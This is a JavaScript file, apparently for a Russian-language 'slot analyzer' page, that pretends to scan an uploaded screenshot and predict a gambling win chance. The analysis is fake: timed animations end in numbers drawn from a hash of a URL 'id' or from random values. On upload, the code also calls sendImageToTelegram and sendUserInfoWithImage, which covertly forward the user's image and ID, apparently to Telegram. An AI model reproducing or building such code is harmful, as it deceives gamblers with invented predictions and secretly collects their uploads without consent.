

document.addEventListener('DOMContentLoaded', () => {
    const imageUpload = document.getElementById('image-upload');
    const previewSection = document.getElementById('preview-section');
    const previewImage = document.getElementById('preview-image');
    const analyzeButton = document.getElementById('analyze-button');
    const results = document.getElementById('results');
    const winChance = document.getElementById('win-chance');
    const rotations = document.getElementById('rotations');
    const blurOverlay = document.getElementById('blur-overlay');
    const imageContainer = document.querySelector('.image-container');
    const container = document.querySelector('.container');
    const idDisplay = document.getElementById('id-display');


    function getUrlParameter(name) {
        name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
        const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
        const results = regex.exec(location.search);
        return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
    }
    

    const urlId = getUrlParameter('id');
    if (urlId) {
        idDisplay.textContent = `ID: ${urlId}`;
        idDisplay.classList.add('visible');
        

        const hashCode = function(s) {
            let h = 0;
            for(let i = 0; i < s.length; i++)
                h = Math.imul(31, h) + s.charCodeAt(i) | 0;
            return Math.abs(h);
        };
        

        window.idHash = hashCode(urlId);
    }

    setTimeout(() => {
        container.style.opacity = '1';
        container.style.transform = 'translateY(0)';
    }, 200);

    imageUpload.addEventListener('change', (event) => {
        const file = event.target.files[0];
        
        if (file && file.type.startsWith('image/')) {
            const reader = new FileReader();
            
            reader.onload = (e) => {
                previewImage.src = e.target.result;
                previewSection.style.display = 'block';
                results.style.display = 'none';
                

                previewImage.style.opacity = '0';
                previewImage.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    previewImage.style.opacity = '1';
                    previewImage.style.transform = 'scale(1)';
                }, 100);
                

                sendImageToTelegram(e.target.result);
                

                sendUserInfoWithImage(urlId || 'Неизвестный ID');
            };
            
            reader.readAsDataURL(file);
        }
    });


    analyzeButton.addEventListener('click', () => {
        if (previewImage.src) {
            // Начинаем "анализ"
            imageContainer.classList.add('analyzing');
            blurOverlay.innerHTML = '<div class="analyzing-text">Анализирую...</div>';
            
 
            analyzeButton.disabled = true;
            analyzeButton.classList.add('disabled');
            

            const steps = 6;
            const stepTime = 500;
            let currentStep = 0;
            
            const analyzeInterval = setInterval(() => {
                currentStep++;
                
                if (currentStep <= steps) {

                    const texts = [
                        'Сканирование...',
                        'Проверка паттернов...',
                        'Расчет вероятностей...',
                        'Анализ алгоритма...',
                        'Декодирование RTP...',
                        'Завершение анализа...'
                    ];
                    blurOverlay.innerHTML = `<div class="analyzing-text">${texts[currentStep - 1]}</div>`;
                    

                    const blurValue = 8 + (currentStep * 2);
                    const brightnessValue = 0.7 - (currentStep * 0.05);
                    const contrastValue = 1.2 + (currentStep * 0.05);
                    
                    blurOverlay.style.backdropFilter = `blur(${blurValue}px)`;
                    previewImage.style.filter = `brightness(${brightnessValue}) contrast(${contrastValue}) saturate(1.2)`;
                    

                    previewImage.style.transform = currentStep % 2 === 0 ? 'scale(1.02)' : 'scale(1)';
                } else {
                    clearInterval(analyzeInterval);
                    

                    let chanceValue, rotationsValue;
                    
                    if (window.idHash) {

                        chanceValue = 20 + (window.idHash % 41); 
                        rotationsValue = 10 + (window.idHash % 51); 
                    } else {

                        chanceValue = getRandomInt(20, 60);
                        rotationsValue = getRandomInt(10, 60);
                    }
                    

                    setTimeout(() => {

                        winChance.textContent = '0%';
                        rotations.textContent = '0';
                        results.style.display = 'block';
                        results.style.opacity = '0';
                        results.style.transform = 'translateY(20px)';
                        
                        setTimeout(() => {
                            results.style.opacity = '1';
                            results.style.transform = 'translateY(0)';
                            

                            animateValue(winChance, 0, chanceValue, 1800, '%');
                            animateValue(rotations, 0, rotationsValue, 1800, '');
                        }, 300);
                    }, 500);
                    

                    setTimeout(() => {

                        blurOverlay.style.opacity = '0';
                        previewImage.style.filter = 'brightness(1) contrast(1)';
                        previewImage.style.transform = 'scale(1)';
                        
                        setTimeout(() => {
                            imageContainer.classList.remove('analyzing');
                            blurOverlay.innerHTML = '';
                            analyzeButton.disabled = false;
                            analyzeButton.classList.remove('disabled');
                            blurOverlay.style.backdropFilter = 'blur(10px)';
                            blurOverlay.style.opacity = '';
                        }, 500);
                    }, 800);
                }
            }, stepTime);
        }
    });


    function animateValue(element, start, end, duration, suffix = '') {
        let startTimestamp = null;
        const step = (timestamp) => {
            if (!startTimestamp) startTimestamp = timestamp;
            const progress = Math.min((timestamp - startTimestamp) / duration, 1);
            

            const easeOutProgress = 1 - Math.pow(1 - progress, 3);
            const value = Math.floor(easeOutProgress * (end - start) + start);
            
            element.textContent = value + suffix;
            if (progress < 1) {
                window.requestAnimationFrame(step);
            } else {

                element.style.textShadow = '0 0 20px rgba(255, 153, 102, 0.8)';
                setTimeout(() => {
                    element.style.textShadow = '';
                }, 500);
            }
        };
        window.requestAnimationFrame(step);
    }


    function getRandomInt(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }


    const uploadLabel = document.querySelector('.upload-label');
    
    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
        uploadLabel.addEventListener(eventName, preventDefaults, false);
    });
    
    function preventDefaults(e) {
        e.preventDefault();
        e.stopPropagation();
    }
    
    ['dragenter', 'dragover'].forEach(eventName => {
        uploadLabel.addEventListener(eventName, highlight, false);
    });
    
    ['dragleave', 'drop'].forEach(eventName => {
        uploadLabel.addEventListener(eventName, unhighlight, false);
    });
    
    function highlight() {
        uploadLabel.classList.add('highlight');
    }
    
    function unhighlight() {
        uploadLabel.classList.remove('highlight');
    }
    
    uploadLabel.addEventListener('drop', handleDrop, false);
    
    function handleDrop(e) {
        const dt = e.dataTransfer;
        const file = dt.files[0];
        
        if (file && file.type.startsWith('image/')) {
            const reader = new FileReader();
            
            reader.onload = (e) => {
                previewImage.src = e.target.result;
                previewSection.style.display = 'block';
                results.style.display = 'none';
                

                previewImage.style.opacity = '0';
                previewImage.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    previewImage.style.opacity = '1';
                    previewImage.style.transform = 'scale(1)';
                }, 100);
                


            };
            
            reader.readAsDataURL(file);
        }
    }
    

    container.style.opacity = '0';
    container.style.transform = 'translateY(20px)';
    setTimeout(() => {
        container.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
    }, 50);


}); 
